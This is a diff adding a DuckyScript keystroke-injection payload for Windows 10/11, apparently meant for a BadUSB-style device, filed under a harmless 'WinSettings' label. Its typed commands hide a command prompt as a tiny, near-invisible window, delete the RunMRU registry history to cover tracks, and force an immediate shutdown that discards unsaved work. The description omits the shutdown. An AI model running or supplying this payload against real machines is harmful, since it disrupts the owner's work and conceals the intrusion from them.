@@ -1,0 +1,25 @@
+REM Title: Shutdown
+REM Author: LingLingAZN
+REM Description: Open CMD prompt as small as possible. Create a small CMD with nearly invisible color and delete run box history.
+REM Target: Windows 10 & 11
+REM Version: 1.1
+REM Category: WinSettings
+REM ---------------------
+GUI r
+DELAY 200
+STRING cmd
+DELAY 100
+ENTER
+DELAY 500
+STRING MODE 15,1
+ENTER
+DELAY 100
+STRING color 01
+ENTER
+DELAY 100
+STRING reg delete HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /va /f
+DELAY 1000
+ENTER
+STRING shutdown /s /t 0 /f
+DELAY 100
+ENTER
